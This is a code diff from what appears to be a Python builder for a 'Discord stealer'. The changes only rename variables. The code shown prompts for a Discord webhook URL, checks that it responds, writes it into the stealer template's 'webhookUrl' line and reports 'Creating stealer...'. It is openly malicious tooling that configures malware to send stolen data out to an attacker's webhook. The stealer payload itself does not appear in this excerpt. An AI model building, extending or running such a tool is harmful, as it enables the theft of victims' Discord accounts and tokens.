@@ -15,10 +15,10 @@ def UpdateWebhook(NewUrl):
 
     try:
         with open(StealerPath, "r") as f:
-            lines = f.readlines()
+            Lines = f.readlines()
 
         with open(destination, "w") as f:
-            for line in lines:
+            for line in Lines:
                 if line.strip().startswith("webhookUrl ="):
                     f.write(f'webhookUrl = "{NewUrl}"\n')
                 else:
@@ -33,25 +33,25 @@ def UpdateWebhook(NewUrl):
 
 def ConfigStealer():
         os.system("cls")
-        Slow(discord_banner)
+        Slow(DiscordBanner)
         time.sleep(1.5)
         os.system("cls")
         print(f"{bracketopen}!{bracketclosed} {Fore.GREEN}Discord stealer{Style.RESET_ALL}")
         print("")
-        WebhookURL = input(f"{bracketopen}>{bracketclosed} {Fore.GREEN}Webhook url -> {Style.RESET_ALL}")
+        WebhookUrl = input(f"{bracketopen}>{bracketclosed} {Fore.GREEN}Webhook url -> {Style.RESET_ALL}")
 
         try:
-            res = requests.get(WebhookURL)
+            res = requests.get(WebhookUrl)
 
-            if not res.status_code in succesStatus:
+            if not res.status_code in SuccesStatus:
                 print("")
                 print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.GREEN} Invalid webhook url{Style.RESET_ALL}")
                 time.sleep(2)
                 return
             
-            check = UpdateWebhook(WebhookURL)
+            WebhookUpdate = UpdateWebhook(WebhookUrl)
 
-            if not check:
+            if not WebhookUpdate:
                 return
             
             print(f"{bracketopen}~{bracketclosed} {Fore.GREEN}Creating stealer... {Style.RESET_ALL}")
@@ -69,17 +69,17 @@ def ConfigStealer():
             print(f"{bracketopen}{Fore.WHITE}02{Style.RESET_ALL}{bracketclosed}{Fore.GREEN} Exit{Style.RESET_ALL}")
             print("")
 
-            command = input(f"""{Fore.GREEN} ┌──({Fore.WHITE}{username}{Fore.GREEN})─[{Fore.WHITE}~/{system_text}/{pc_name}{Fore.GREEN}]
+            Command = input(f"""{Fore.GREEN} ┌──({Fore.WHITE}{Username}{Fore.GREEN})─[{Fore.WHITE}~/{System}/{PcName}{Fore.GREEN}]
  └─{Fore.WHITE}$ {Style.RESET_ALL}""")
 
-            if command == "1" or command == "01":
+            if Command == "1" or Command == "01":
                 pass
-            elif command == "2" or command == "02":
+            elif Command == "2" or Command == "02":
                 sys.exit()
             else:
                 pass
             
-        except Exception as e:
+        except Exception:
             print("")
             print(f"{bracketopen}{Fore.WHITE}!{Style.RESET_ALL}{bracketclosed}{Fore.GREEN} Error creating stealer{Style.RESET_ALL}")
             time.sleep(2)
